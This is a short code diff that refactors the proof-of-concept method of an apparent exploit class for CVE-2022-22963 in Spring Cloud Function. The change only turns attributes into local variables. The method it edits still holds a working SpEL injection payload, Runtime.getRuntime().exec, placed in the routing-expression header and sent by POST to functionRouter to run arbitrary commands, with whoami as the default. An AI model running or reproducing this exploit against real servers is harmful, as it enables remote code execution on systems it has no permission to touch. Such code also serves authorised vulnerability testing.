@@ -12,9 +12,9 @@ class CVE_2022_22963:
 
         self.path = 'functionRouter'
     def poc(self,url,proxies,ProxyStute,cmd="whoami"):
-        self.payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
+        payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
         self.header = {
-            'spring.cloud.function.routing-expression': self.payload,
+            'spring.cloud.function.routing-expression': payload,
             'Accept-Encoding': 'gzip, deflate',
             'Accept': '*/*',
             'Accept-Language': 'en',
@@ -26,7 +26,7 @@ class CVE_2022_22963:
         else:
             proxies = None
         try:
-            self.url = url + self.path
+            url = url + self.path
             requests.packages.urllib3.disable_warnings()
 
             req = requests.post(url=url,headers=self.header,
